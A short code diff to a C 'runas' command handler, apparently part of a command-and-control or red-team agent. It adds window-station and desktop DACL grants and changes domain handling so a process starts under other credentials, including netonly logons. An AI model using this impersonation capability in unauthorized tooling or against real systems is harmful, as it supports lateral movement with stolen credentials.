@@ -94,6 +94,14 @@ void command_runas(char *task_id, char *params) {
     wchar_t wcmd[2048] = {0};
     MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wcmd, 2048);
 
+    /* For interactive logons (not netonly/9), add the user SID to the window
+     * station and desktop DACLs - required or CreateProcessWithLogonW returns 5. */
+    char desktop_name[320] = {0};
+    if (logon_type != 9)
+        grant_winsta_desktop_access(username,
+                                    domain[0] ? domain : NULL,
+                                    desktop_name, sizeof(desktop_name));
+
     STARTUPINFOW si;
     ZeroMemory(&si, sizeof(si));
     si.cb          = sizeof(si);
@@ -102,6 +110,11 @@ void command_runas(char *task_id, char *params) {
     si.hStdOutput  = hWriteOut;
     si.hStdError   = hWriteErr;
     si.hStdInput   = NULL;
+    if (desktop_name[0]) {
+        wchar_t wdesktop[320] = {0};
+        MultiByteToWideChar(CP_UTF8, 0, desktop_name, -1, wdesktop, 320);
+        si.lpDesktop = wdesktop;
+    }
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
@@ -109,8 +122,10 @@ void command_runas(char *task_id, char *params) {
     /* logon_type 9 (NewCredentials) -> LOGON_NETCREDENTIALS_ONLY, others -> LOGON_WITH_PROFILE */
     DWORD logon_flags = (logon_type == 9) ? LOGON_NETCREDENTIALS_ONLY : LOGON_WITH_PROFILE;
 
+    /* NULL domain = Windows auto-resolves domain accounts */
+    int use_domain = (domain[0] && strcmp(domain, ".") != 0);
     BOOL ok = CreateProcessWithLogonW(
-        wusername, wdomain, wpassword,
+        wusername, use_domain ? wdomain : NULL, wpassword,
         logon_flags,
         NULL, wcmd,
         CREATE_NO_WINDOW,
